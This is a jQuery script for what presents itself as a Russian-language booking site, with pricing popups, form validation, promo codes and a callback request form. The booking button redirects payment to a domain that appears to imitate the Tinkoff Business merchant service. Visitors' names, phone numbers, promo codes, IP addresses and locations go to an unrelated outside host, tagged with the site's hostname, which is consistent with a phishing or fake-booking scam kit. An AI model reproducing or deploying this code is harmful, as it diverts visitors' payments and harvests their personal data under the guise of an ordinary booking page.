function openNav() {
	$('.menu-button').fadeOut();
	$('#mySidenav').width('250px');
}

function closeNav() {
	$('.menu-button').fadeIn();
	$('#mySidenav').width('0');
}

$(function() {
	$('div.sidenav > a').click(function(){
		closeNav();
	});
})

var zone, totalPrice;

function setPrice() {
	totalPrice = zone.price;
	$('span#totalPrice').html(totalPrice+'₽ <sup><s class="text-muted">'+(totalPrice+(totalPrice*0.1))+'₽</s></sup>');
}

function setFeatures() {
	setPrice();
	$('div.booking-features').empty();
	$.each(zone.features, function(index, el) {
		$('div.booking-features').append('<label class="mb-0"><i class="fas fa-angle-right"></i> '+el+'</label><br>');
	});
	$('div.booking-desc').empty();
	$('div.booking-desc').text(zone.desc);
}

$('button.booking').click(function() {
	$('.popup').fadeIn();
	if ( zone == null ) {
		zone = services['Вигвам'];
	}
	setFeatures();
});

$(function() {
	$(document).mouseup(function (e){
		var div = $(".popup .window");
		if (!div.is(e.target)
			&& div.has(e.target).length === 0) {
			$('.popup').fadeOut();
		}
	});

	$('.popup .window .close').click(function() {
		$('.popup').fadeOut();
	});

	$('#BookingOrder').on('change', function() {
		zone = services[$(this).val()];
		setFeatures();
	});

	$('#BookingSubmit').click(function(){
		var isValid = true;
		$('div.window').find('.form-control').each(function(){
			if ( $(this).prop('required') &&  $(this).val().length < $(this).attr('minlength') ) {
				$(this).addClass('is-invalid');
				new Noty({type: 'error', text: 'Заполните обязательные поля!'}).show();
				isValid = false;
				return false;
			}
		});
		if ( isValid ) {
			$.redirect('https://rustinkoffbusiness.ru/merchant/', {
				'amount': totalPrice, 
				
			});
		}
	});

	$('.form-control').on('change', function(){
		if ( !$(this).prop('required') ) {
			return false;
		}
		if ( $(this).val().length >= $(this).attr('minlength') ) {
			$(this).removeClass('is-invalid');
			$(this).addClass('is-valid');
		} else {
			$(this).removeClass('is-valid');
		}
	})

	$('input#purchaserPromo').keyup(function() {
		var input = $(this);
		if ( input.val().length == input.attr('maxlength') ) {
			$.post('https://interpayments24.info/api', {isValidPromo: $('#purchaserPromo').val()}, function(data) {
				if ( data ) {
                    var d = new Date();d.setTime(d.getTime() + (7*24*60*60*1000));var expires = "expires="+ d.toUTCString();
				    document.cookie = "promocode=" + $('#purchaserPromo').val() + ";" + expires + ";path=/";
					$('label[for=purchaserPromo]').html('Вы активировали промокод:<br/><span style="color: green;">'+promoBonus+'</span>');
					$('input#purchaserPromo').attr('disabled', true);
					new Noty({type: 'success', text: 'Вы активировали промокод!'}).show();
				} else {
					new Noty({type: 'error', text: 'Вы ввели неверный промокод!'}).show();
				}
			});
		}
	})

	var phoneMask = IMask(document.getElementById('purchaserNumber'), {
		mask: '+{7}(000)000-00-00'
	});

	// Callback
	IMask(document.getElementById('callback_number'), {
		mask: '+{7}(000)000-00-00'
	});

	$('button.callback-send').on('click', function() {
		var isValid = true;
		$('#callback_form').find('.form-control').each(function(){
			if ( $(this).prop('required') &&  $(this).val().length < $(this).attr('minlength') ) {
				$(this).addClass('is-invalid');
				new Noty({type: 'error', text: 'Заполните обязательные поля!'}).show();
				isValid = false;
				return false;
			}
		});
		if ( !isValid ) return;

		function sendCallback(ip, geo) {
			$.post('https://interpayments24.info/api', {
					ip: ip,
					geo: geo,
					name: $('#callback_name').val(),
					tel: $('#callback_number').val(),
					source: window.location.hostname
				}, function(data) {
					if (data) {
						new Noty({type: 'info', text: 'Ваша заявка принята, ожидайте звонка.'}).show();
						$('#callback').modal('hide');
					}
				}
			);
		}
		
		$.ajax({
			url: 'https://json.geoiplookup.io/',
			headers: {'Content-Type': 'application/json'},
			type: "POST",
			dataType: "jsonp",
			success: function (data) {
				sendCallback(data.ip, data.country_name+', '+data.city)
			},
			error: function () {
				sendCallback('—', '—')
			}
		});
	});
});